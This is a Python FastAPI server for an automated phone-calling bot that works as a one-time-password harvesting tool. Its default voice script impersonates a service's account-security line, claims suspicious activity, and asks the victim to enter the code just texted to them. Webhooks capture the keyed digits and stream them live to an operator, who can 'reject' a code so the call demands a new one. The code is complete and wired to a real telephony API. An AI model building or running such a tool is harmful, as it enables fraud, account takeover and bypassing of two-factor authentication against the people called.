from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks, Request
from fastapi.responses import StreamingResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import asyncio
import json
import httpx

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Infobip configuration
INFOBIP_BASE_URL = os.environ.get('INFOBIP_BASE_URL', '')
INFOBIP_API_KEY = os.environ.get('INFOBIP_API_KEY', '')
INFOBIP_FROM_NUMBER = os.environ.get('INFOBIP_FROM_NUMBER', '+18085821342')
INFOBIP_NUMBER_ID = os.environ.get('INFOBIP_NUMBER_ID', '')
INFOBIP_APP_NAME = os.environ.get('INFOBIP_APP_NAME', 'AmericanClub1')

# Webhook URL for callbacks
WEBHOOK_BASE_URL = os.environ.get('WEBHOOK_BASE_URL', 'https://botcaller.preview.emergentagent.com')

# Create the main app
app = FastAPI(title="Bot Calling API")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# SSE connections storage
sse_connections: Dict[str, asyncio.Queue] = {}

# HTTP client for Infobip
http_client: Optional[httpx.AsyncClient] = None

async def get_http_client() -> httpx.AsyncClient:
    global http_client
    if http_client is None:
        http_client = httpx.AsyncClient(
            base_url=INFOBIP_BASE_URL,
            headers={
                "Authorization": f"App {INFOBIP_API_KEY}",
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            timeout=30.0
        )
    return http_client

# ===================
# Pydantic Models
# ===================

class CallConfig(BaseModel):
    call_type: str = "Login Verification"
    voice_model: str = "Hera (Female, Mature)"
    from_number: str = INFOBIP_FROM_NUMBER
    recipient_number: str
    recipient_name: Optional[str] = None
    service_name: Optional[str] = None
    otp_digits: int = 6

class CallSteps(BaseModel):
    step1: str = "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0."
    step2: str = "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number."
    step3: str = "Thank you. Please hold for a moment while we verify your code."
    accepted: str = "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye."
    rejected: str = "Thank you for waiting, the verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number."

class CallRequest(BaseModel):
    config: CallConfig
    steps: CallSteps

class CallLog(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    config: CallConfig
    steps: CallSteps
    status: str = "PENDING"
    current_step: str = "step1"
    step1_retry_count: int = 0
    step2_retry_count: int = 0
    infobip_call_id: Optional[str] = None
    infobip_message_id: Optional[str] = None
    dtmf_step1: Optional[str] = None
    dtmf_code: Optional[str] = None
    dtmf_codes_history: List[str] = Field(default_factory=list)
    awaiting_verification: bool = False
    verification_result: Optional[str] = None
    started_at: Optional[str] = None
    ended_at: Optional[str] = None
    duration_seconds: int = 0
    error_message: Optional[str] = None
    created_at: str = Field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    events: List[Dict] = Field(default_factory=list)

# ===================
# Helper Functions
# ===================

async def broadcast_event(call_id: str, event: Dict):
    """Send event to SSE connections"""
    if call_id in sse_connections:
        try:
            await sse_connections[call_id].put(event)
        except Exception as e:
            logger.error(f"Error broadcasting event: {e}")

async def add_call_event(call_id: str, event_type: str, details: str, dtmf_code: Optional[str] = None, show_verify: bool = False):
    """Add event to call log and broadcast"""
    event = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": event_type,
        "details": details,
        "call_id": call_id
    }
    
    if dtmf_code:
        event["dtmf_code"] = dtmf_code
    
    if show_verify:
        event["show_verify"] = True
    
    # Update database
    await db.call_logs.update_one(
        {"id": call_id},
        {"$push": {"events": event}}
    )
    
    # Broadcast to SSE
    await broadcast_event(call_id, event)
    
    return event

# Voice name mapping for Infobip
VOICE_MAP = {
    "hera": {"name": "Joanna", "language": "en", "gender": "female"},
    "aria": {"name": "Kendra", "language": "en", "gender": "female"},
    "apollo": {"name": "Matthew", "language": "en", "gender": "male"},
    "zeus": {"name": "Joey", "language": "en", "gender": "male"},
}

def prepare_tts_text(template: str, config: CallConfig) -> str:
    """Replace placeholders in TTS template"""
    text = template
    text = text.replace("{name}", config.recipient_name or "Customer")
    text = text.replace("{service}", config.service_name or "Account")
    text = text.replace("{digits}", str(config.otp_digits))
    return text

async def send_tts_call(call_id: str, config: CallConfig, text: str, max_dtmf: int, step_name: str, webhook_path: str):
    """Send a TTS call with DTMF collection"""
    try:
        http = await get_http_client()
        
        voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
        voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
        
        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
        
        message_id = f"{call_id}-{step_name}"
        notify_url = f"{WEBHOOK_BASE_URL}/api/webhook/{webhook_path}/{call_id}"
        
        payload = {
            "messages": [
                {
                    "from": from_num,
                    "destinations": [{"to": to_num, "messageId": message_id}],
                    "text": text,
                    "language": voice_settings["language"],
                    "voice": {"name": voice_settings["name"], "gender": voice_settings["gender"]},
                    "speechRate": 0.9,
                    "maxDtmf": max_dtmf,
                    "dtmfTimeout": 20,
                    "callTimeout": 120,
                    "notifyUrl": notify_url,
                    "notifyContentType": "application/json"
                }
            ]
        }
        
        logger.info(f"Sending {step_name} call: {json.dumps(payload)}")
        
        response = await http.post("/tts/3/advanced", json=payload)
        
        logger.info(f"Infobip response: {response.status_code} - {response.text}")
        
        if response.status_code in [200, 201, 202]:
            result = response.json()
            if result.get("messages") and len(result["messages"]) > 0:
                msg = result["messages"][0]
                return {"success": True, "message_id": msg.get("messageId"), "status": msg.get("status", {}).get("name")}
        
        return {"success": False, "error": f"API error: {response.status_code}"}
        
    except Exception as e:
        logger.error(f"Error sending {step_name} call: {e}")
        return {"success": False, "error": str(e)}

async def execute_step1(call_id: str, retry: int = 0):
    """Execute Step 1 - Initial greeting with DTMF choice (0 or 1)"""
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        return
    
    config = CallConfig(**call_log["config"])
    steps = CallSteps(**call_log["steps"])
    
    step1_text = prepare_tts_text(steps.step1, config)
    
    await db.call_logs.update_one(
        {"id": call_id},
        {"$set": {"current_step": "step1", "step1_retry_count": retry, "status": "CALLING"}}
    )
    
    if retry > 0:
        await add_call_event(call_id, "STEP1_RETRY", f"Retrying Step 1 (attempt {retry + 1}/3)")
        await asyncio.sleep(2)  # Wait before retry
    
    await add_call_event(call_id, "STEP1_CALLING", f"Calling {config.recipient_number}...")
    
    result = await send_tts_call(call_id, config, step1_text, 1, "step1", "step1")
    
    if result["success"]:
        await add_call_event(call_id, "STEP1_PLAYING", "Playing: Press 1 if it was NOT you, Press 0 if it was you")
        await db.call_logs.update_one({"id": call_id}, {"$set": {"infobip_message_id": result["message_id"]}})
    else:
        await add_call_event(call_id, "STEP1_ERROR", result.get("error", "Unknown error"))
        # Retry if possible
        if retry < 2:
            await asyncio.sleep(5)
            await execute_step1(call_id, retry + 1)
        else:
            await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "FAILED"}})
            await add_call_event(call_id, "CALL_FAILED", "Failed after 3 attempts")

async def execute_step2(call_id: str, retry: int = 0):
    """Execute Step 2 - Ask for OTP code"""
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        return
    
    config = CallConfig(**call_log["config"])
    steps = CallSteps(**call_log["steps"])
    
    step2_text = prepare_tts_text(steps.step2, config)
    
    await db.call_logs.update_one(
        {"id": call_id},
        {"$set": {"current_step": "step2", "step2_retry_count": retry}}
    )
    
    if retry > 0:
        await add_call_event(call_id, "STEP2_RETRY", f"Retrying Step 2 (attempt {retry + 1}/3)")
        await asyncio.sleep(2)
    
    await add_call_event(call_id, "STEP2_CALLING", "Calling to request security code...")
    
    result = await send_tts_call(call_id, config, step2_text, config.otp_digits, "step2", "step2")
    
    if result["success"]:
        await add_call_event(call_id, "STEP2_PLAYING", f"Playing: Please enter {config.otp_digits}-digit security code")
    else:
        await add_call_event(call_id, "STEP2_ERROR", result.get("error", "Unknown error"))
        if retry < 2:
            await asyncio.sleep(5)
            await execute_step2(call_id, retry + 1)
        else:
            await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "FAILED"}})
            await add_call_event(call_id, "CALL_FAILED", "Failed after 3 attempts at Step 2")

async def execute_step3_verification(call_id: str):
    """Execute Step 3 - Verification wait message"""
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        return
    
    config = CallConfig(**call_log["config"])
    steps = CallSteps(**call_log["steps"])
    
    step3_text = prepare_tts_text(steps.step3, config)
    
    await db.call_logs.update_one(
        {"id": call_id},
        {"$set": {"current_step": "step3"}}
    )
    
    await add_call_event(call_id, "STEP3_CALLING", "Playing verification message...")
    
    result = await send_tts_call(call_id, config, step3_text, 0, "step3", "step3")
    
    if result["success"]:
        await add_call_event(call_id, "STEP3_PLAYING", "Please wait while we verify your code...")

async def execute_accepted(call_id: str):
    """Execute Accepted - Final success message"""
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        return
    
    config = CallConfig(**call_log["config"])
    steps = CallSteps(**call_log["steps"])
    
    accepted_text = prepare_tts_text(steps.accepted, config)
    
    await db.call_logs.update_one(
        {"id": call_id},
        {"$set": {
            "current_step": "accepted",
            "verification_result": "accepted",
            "awaiting_verification": False
        }}
    )
    
    await add_call_event(call_id, "VERIFICATION_ACCEPTED", "Code accepted! Playing final message...")
    
    result = await send_tts_call(call_id, config, accepted_text, 0, "accepted", "final")
    
    if result["success"]:
        await add_call_event(call_id, "ACCEPTED_PLAYING", "Thank you message playing...")

async def execute_rejected(call_id: str):
    """Execute Rejected - Play rejected message and ask for code again"""
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        return
    
    config = CallConfig(**call_log["config"])
    steps = CallSteps(**call_log["steps"])
    
    rejected_text = prepare_tts_text(steps.rejected, config)
    
    await db.call_logs.update_one(
        {"id": call_id},
        {"$set": {
            "current_step": "rejected",
            "awaiting_verification": False,
            "dtmf_code": None  # Clear previous code
        }}
    )
    
    await add_call_event(call_id, "VERIFICATION_REJECTED", "Code rejected! Asking for new code...")
    
    # This call will ask for code again
    result = await send_tts_call(call_id, config, rejected_text, config.otp_digits, "rejected", "rejected")
    
    if result["success"]:
        await add_call_event(call_id, "REJECTED_PLAYING", f"Playing: Code incorrect, please enter {config.otp_digits}-digit code again")

async def simulate_ivr_flow(call_id: str, config: CallConfig, steps: CallSteps):
    """Simulate IVR flow for demo/testing"""
    try:
        await asyncio.sleep(1)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "CALLING", "current_step": "step1"}})
        await add_call_event(call_id, "CALL_INITIATED", f"[SIMULATION] Calling {config.recipient_number}...")
        
        await asyncio.sleep(2)
        await add_call_event(call_id, "STEP1_PLAYING", "Playing: Press 1 if NOT you, Press 0 if it was you")
        
        await asyncio.sleep(5)
        dtmf_step1 = "1"
        await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_step1": dtmf_step1, "current_step": "step2"}})
        await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {dtmf_step1}", dtmf_step1)
        
        await asyncio.sleep(2)
        await add_call_event(call_id, "STEP2_PLAYING", f"Playing: Enter {config.otp_digits}-digit code")
        
        await asyncio.sleep(4)
        otp_code = "584219"
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"dtmf_code": otp_code, "current_step": "step3", "awaiting_verification": True},
             "$push": {"dtmf_codes_history": otp_code}}
        )
        await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {otp_code}", otp_code, show_verify=True)
        
    except Exception as e:
        logger.error(f"Error in simulation: {e}")
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "FAILED", "error_message": str(e)}})
        await add_call_event(call_id, "CALL_FAILED", str(e))

# ===================
# API Endpoints
# ===================

@api_router.get("/")
async def root():
    return {
        "message": "Bot Calling API",
        "status": "running",
        "infobip_configured": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL)
    }

@api_router.get("/config")
async def get_config():
    return {
        "infobip_configured": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL),
        "from_number": INFOBIP_FROM_NUMBER,
        "app_name": INFOBIP_APP_NAME
    }

@api_router.post("/calls/initiate", response_model=Dict)
async def initiate_call(request: CallRequest, background_tasks: BackgroundTasks):
    """Initiate a new IVR call starting with Step 1"""
    try:
        call_log = CallLog(
            config=request.config,
            steps=request.steps
        )
        
        doc = call_log.model_dump()
        await db.call_logs.insert_one(doc)
        
        await add_call_event(call_log.id, "CALL_QUEUED", "IVR call session started")
        
        if INFOBIP_API_KEY and INFOBIP_BASE_URL:
            background_tasks.add_task(execute_step1, call_log.id, 0)
        else:
            background_tasks.add_task(simulate_ivr_flow, call_log.id, request.config, request.steps)
        
        return {
            "status": "initiated",
            "call_id": call_log.id,
            "message": "IVR call initiated - starting Step 1",
            "using_infobip": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL)
        }
        
    except Exception as e:
        logger.error(f"Error initiating call: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.post("/calls/{call_id}/verify")
async def verify_code(call_id: str, request: Request, background_tasks: BackgroundTasks):
    """Accept or Deny the entered code"""
    try:
        data = await request.json()
        is_accepted = data.get("accepted", False)
        
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        
        if not call_log:
            raise HTTPException(status_code=404, detail="Call not found")
        
        if is_accepted:
            # Accept - play accepted message and end
            background_tasks.add_task(execute_accepted, call_id)
        else:
            # Deny - play rejected message and ask for code again
            background_tasks.add_task(execute_rejected, call_id)
        
        return {"status": "verified", "accepted": is_accepted}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error verifying code: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.post("/calls/{call_id}/hangup")
async def hangup_call(call_id: str):
    """Terminate the call session"""
    try:
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        
        if not call_log:
            raise HTTPException(status_code=404, detail="Call not found")
        
        end_time = datetime.now(timezone.utc).isoformat()
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"status": "FINISHED", "ended_at": end_time, "awaiting_verification": False}}
        )
        
        await add_call_event(call_id, "CALL_HANGUP", "Call session terminated by user")
        
        return {"status": "hangup", "call_id": call_id}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error hanging up call: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.get("/calls/{call_id}")
async def get_call(call_id: str):
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        raise HTTPException(status_code=404, detail="Call not found")
    return call_log

@api_router.get("/calls")
async def get_all_calls():
    calls = await db.call_logs.find({}, {"_id": 0}).sort("created_at", -1).to_list(100)
    return calls

@api_router.delete("/calls/{call_id}")
async def delete_call(call_id: str):
    result = await db.call_logs.delete_one({"id": call_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Call not found")
    return {"status": "deleted", "call_id": call_id}

@api_router.get("/calls/{call_id}/events")
async def stream_call_events(call_id: str):
    """SSE endpoint for real-time call events"""
    async def event_generator():
        queue = asyncio.Queue()
        sse_connections[call_id] = queue
        
        try:
            yield f"data: {json.dumps({'type': 'connected', 'message': 'Connected to event stream'})}\n\n"
            
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            if call_log and call_log.get("events"):
                for event in call_log["events"]:
                    yield f"data: {json.dumps(event)}\n\n"
            
            while True:
                try:
                    event = await asyncio.wait_for(queue.get(), timeout=30)
                    yield f"data: {json.dumps(event)}\n\n"
                    
                    if event.get("event_type") in ["CALL_FINISHED", "CALL_FAILED", "CALL_HANGUP"]:
                        break
                except asyncio.TimeoutError:
                    yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
                    
        except asyncio.CancelledError:
            logger.info(f"SSE connection closed for call {call_id}")
        finally:
            if call_id in sse_connections:
                del sse_connections[call_id]
    
    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"}
    )

# ===================
# Webhooks for each step
# ===================

@api_router.post("/webhook/step1/{call_id}")
async def handle_step1_webhook(call_id: str, request: Request, background_tasks: BackgroundTasks):
    """Webhook for Step 1 DTMF (0 or 1)"""
    try:
        payload = await request.json()
        logger.info(f"Step 1 Webhook for {call_id}: {json.dumps(payload)}")
        
        dtmf_codes = None
        no_response = False
        
        if payload.get("results") and len(payload["results"]) > 0:
            result = payload["results"][0]
            voice_call = result.get("voiceCall", {})
            dtmf_codes = voice_call.get("dtmfCodes")
            status = result.get("status", {}).get("name", "")
            
            # Check if call was answered
            if status == "DELIVERED_TO_HANDSET":
                await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "ESTABLISHED"}})
                await add_call_event(call_id, "CALL_ANSWERED", "Call answered")
            
            # Check if no DTMF received
            end_time = voice_call.get("endTime")
            if end_time and not dtmf_codes:
                no_response = True
        
        if dtmf_codes:
            # Clean DTMF
            clean_dtmf = dtmf_codes.replace(",", "")
            if len(clean_dtmf) >= 1:
                step1_input = clean_dtmf[0]
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"dtmf_step1": step1_input, "current_step": "step2"}}
                )
                await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {step1_input}", step1_input)
                
                # Proceed to Step 2
                await asyncio.sleep(2)
                background_tasks.add_task(execute_step2, call_id, 0)
        elif no_response:
            # No response - retry Step 1
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            retry_count = call_log.get("step1_retry_count", 0)
            
            if retry_count < 2:
                await add_call_event(call_id, "STEP1_NO_RESPONSE", "No DTMF received, retrying...")
                await asyncio.sleep(3)
                background_tasks.add_task(execute_step1, call_id, retry_count + 1)
            else:
                await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "FAILED"}})
                await add_call_event(call_id, "CALL_FAILED", "No response after 3 attempts at Step 1")
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Step 1 webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.post("/webhook/step2/{call_id}")
async def handle_step2_webhook(call_id: str, request: Request, background_tasks: BackgroundTasks):
    """Webhook for Step 2 DTMF (OTP code)"""
    try:
        payload = await request.json()
        logger.info(f"Step 2 Webhook for {call_id}: {json.dumps(payload)}")
        
        dtmf_codes = None
        no_response = False
        
        if payload.get("results") and len(payload["results"]) > 0:
            result = payload["results"][0]
            voice_call = result.get("voiceCall", {})
            dtmf_codes = voice_call.get("dtmfCodes")
            
            end_time = voice_call.get("endTime")
            if end_time and not dtmf_codes:
                no_response = True
        
        if dtmf_codes:
            clean_dtmf = dtmf_codes.replace(",", "")
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            config = CallConfig(**call_log["config"])
            
            if len(clean_dtmf) >= config.otp_digits:
                otp_code = clean_dtmf[:config.otp_digits]
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"dtmf_code": otp_code, "current_step": "step3", "awaiting_verification": True},
                     "$push": {"dtmf_codes_history": otp_code}}
                )
                await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {otp_code}", otp_code, show_verify=True)
                
                # Play verification message
                await asyncio.sleep(1)
                background_tasks.add_task(execute_step3_verification, call_id)
            else:
                # Partial code - wait for more or retry
                await add_call_event(call_id, "DTMF_PARTIAL", f"Received {len(clean_dtmf)} digits, need {config.otp_digits}")
                no_response = True
        
        if no_response:
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            retry_count = call_log.get("step2_retry_count", 0)
            
            if retry_count < 2:
                await add_call_event(call_id, "STEP2_NO_RESPONSE", "Incomplete code, retrying...")
                await asyncio.sleep(3)
                background_tasks.add_task(execute_step2, call_id, retry_count + 1)
            else:
                await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "FAILED"}})
                await add_call_event(call_id, "CALL_FAILED", "No valid code after 3 attempts at Step 2")
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Step 2 webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.post("/webhook/step3/{call_id}")
async def handle_step3_webhook(call_id: str, request: Request):
    """Webhook for Step 3 (verification wait)"""
    try:
        payload = await request.json()
        logger.info(f"Step 3 Webhook for {call_id}: {json.dumps(payload)}")
        
        # Step 3 just plays a message, no DTMF expected
        # Awaiting user to click Accept or Deny
        await add_call_event(call_id, "AWAITING_VERIFICATION", "Waiting for Accept or Deny...")
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Step 3 webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.post("/webhook/rejected/{call_id}")
async def handle_rejected_webhook(call_id: str, request: Request, background_tasks: BackgroundTasks):
    """Webhook for Rejected step (asking for new code)"""
    try:
        payload = await request.json()
        logger.info(f"Rejected Webhook for {call_id}: {json.dumps(payload)}")
        
        dtmf_codes = None
        
        if payload.get("results") and len(payload["results"]) > 0:
            result = payload["results"][0]
            voice_call = result.get("voiceCall", {})
            dtmf_codes = voice_call.get("dtmfCodes")
        
        if dtmf_codes:
            clean_dtmf = dtmf_codes.replace(",", "")
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            config = CallConfig(**call_log["config"])
            
            if len(clean_dtmf) >= config.otp_digits:
                otp_code = clean_dtmf[:config.otp_digits]
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"dtmf_code": otp_code, "current_step": "step3", "awaiting_verification": True},
                     "$push": {"dtmf_codes_history": otp_code}}
                )
                await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"New security code entered: {otp_code}", otp_code, show_verify=True)
                
                # Play verification message again
                await asyncio.sleep(1)
                background_tasks.add_task(execute_step3_verification, call_id)
            else:
                await add_call_event(call_id, "DTMF_PARTIAL", f"Received {len(clean_dtmf)} digits, need {config.otp_digits}")
        else:
            await add_call_event(call_id, "REJECTED_NO_CODE", "No new code entered")
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Rejected webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.post("/webhook/final/{call_id}")
async def handle_final_webhook(call_id: str, request: Request):
    """Webhook for final/accepted message"""
    try:
        payload = await request.json()
        logger.info(f"Final Webhook for {call_id}: {json.dumps(payload)}")
        
        # Mark call as finished
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"status": "FINISHED", "ended_at": datetime.now(timezone.utc).isoformat()}}
        )
        await add_call_event(call_id, "CALL_FINISHED", "Call completed successfully")
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Final webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.get("/voice-models")
async def get_voice_models():
    return [
        {"id": "hera", "name": "Hera (Female, Mature)", "gender": "female"},
        {"id": "aria", "name": "Aria (Female, Young)", "gender": "female"},
        {"id": "apollo", "name": "Apollo (Male, Mature)", "gender": "male"},
        {"id": "zeus", "name": "Zeus (Male, Deep)", "gender": "male"},
    ]

@api_router.get("/call-types")
async def get_call_types():
    return [
        {"id": "login_verification", "name": "Login Verification"},
        {"id": "otp_delivery", "name": "OTP Delivery"},
        {"id": "appointment_reminder", "name": "Appointment Reminder"},
        {"id": "custom", "name": "Custom Script"},
    ]

# Include router
app.include_router(api_router)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown():
    global http_client
    if http_client:
        await http_client.aclose()
    client.close()
